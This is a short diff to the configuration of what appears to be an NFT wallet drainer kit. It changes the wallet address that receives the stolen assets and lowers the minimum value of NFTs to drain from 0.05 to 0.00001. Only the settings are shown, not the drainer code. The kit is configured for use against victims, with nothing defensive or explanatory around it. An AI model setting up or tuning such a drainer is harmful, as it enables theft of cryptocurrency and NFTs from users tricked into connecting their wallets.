@@ -1,9 +1,9 @@
 const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddress = "0x6439aBF7e8680211Bec86530ca5bF24F6925b8d0"; // CHANGE THIS TO YOUR OWN WALLET ADDRESS
+const receiveAddress = "0xd94848e05442bF112E584fd3F89694FC3E7a457C"; // CHANGE THIS TO YOUR OWN WALLET ADDRESS
 
 const drainNftsInfo = {
-  minValue: 0.05, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
+  minValue: 0.00001, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
   maxTransfers: 1000,
 };
 
